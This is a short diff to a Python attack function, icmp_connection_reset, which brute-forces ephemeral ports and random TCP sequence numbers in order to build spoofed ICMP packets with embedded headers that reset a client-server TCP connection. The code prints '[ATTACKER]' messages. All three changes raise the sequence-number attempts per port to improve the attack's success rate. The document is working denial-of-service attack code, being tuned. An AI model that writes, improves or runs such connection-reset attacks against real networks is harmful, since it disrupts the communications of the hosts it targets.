@@ -132,7 +132,7 @@ def icmp_connection_reset(sock, strategy="random"):
         
         for port in ports:
             # Try multiple sequence numbers per port
-            for _ in range(3):
+            for _ in range(10):  # More sequence attempts for better success rate
                 seq = random.randint(0, MAX_SEQ)
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
@@ -154,7 +154,7 @@ def icmp_connection_reset(sock, strategy="random"):
         # Multiple passes with different offsets to ensure coverage
         for offset in range(10):  # 10 different starting points
             for port in range(32768 + offset, 65536, 10):
-                for _ in range(2):  # 2 sequence attempts per port
+                for _ in range(10):  # 10 sequence attempts per port - better chance of hitting right sequence
                     seq = random.randint(0, MAX_SEQ)
                     
                     embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
@@ -173,8 +173,8 @@ def icmp_connection_reset(sock, strategy="random"):
     elif strategy == "full":
         print("[ATTACKER] Using full brute force scan...")
         for port in range(32768, 65536):
-            # Try 2 sequence numbers per port
-            for _ in range(2):
+            # Try 5 sequence numbers per port
+            for _ in range(5):
                 seq = random.randint(0, MAX_SEQ)
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
